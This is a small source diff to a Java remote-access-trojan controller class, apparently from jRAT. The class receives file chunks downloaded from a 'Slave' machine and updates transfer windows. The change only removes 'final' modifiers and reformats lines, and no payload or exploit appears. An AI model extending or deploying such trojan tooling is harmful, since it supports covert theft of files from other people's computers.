@@ -11,17 +11,15 @@ import se.jrat.common.io.TransferData;
 
 
 public class Packet29ServerDownloadPart extends AbstractIncomingPacket {
-
+	
 	@Override
-	public void read(final Slave slave, DataInputStream dis) throws Exception {
-		final String remotePath = slave.readLine();
+	public void read(Slave slave, DataInputStream dis) throws Exception {
+		String remotePath = slave.readLine();
 		int len = dis.readInt();
 		byte[] buffer = new byte[len];
 		dis.readFully(buffer);
-		
-		final FrameFileTransfer frame = FrameFileTransfer.instance;
-		final FrameRemoteFiles frame2 = FrameRemoteFiles.instances.get(slave);
-
+		FrameFileTransfer frame = FrameFileTransfer.instance;
+		FrameRemoteFiles frame2 = FrameRemoteFiles.instances.get(slave);
 		if (frame2 != null) {
 			frame2.start();
 		}
